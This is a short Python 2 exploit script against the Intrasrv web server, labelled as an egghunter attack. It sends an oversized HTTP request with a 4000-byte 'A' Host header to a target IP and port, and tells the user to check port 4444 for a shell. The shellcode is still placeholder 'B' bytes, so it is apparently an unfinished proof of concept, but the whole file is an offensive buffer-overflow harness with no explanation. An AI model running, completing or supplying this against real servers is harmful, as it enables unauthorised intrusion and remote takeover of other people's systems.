#!/usr/bin/python
import socket
import time
import sys 

banner = """
#----------------------------------------------#
Intrasrv Exploit - Egghunter
#----------------------------------------------#
"""

if len(sys.argv) != 3:
    print "Usage: ./intrasrv.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
 
buf = "A" * 4000
shellcode = "B" * 1000

header = (
'GET / HTTP/1.1\r\n'
'Host: %s \r\n'
'Content-Type: application/x-www-form-urlencoded\r\n'
'User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n'
'Content-Length: 1048580\r\n\r\n %s') % (buf, shellcode)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 4444 for your shell"
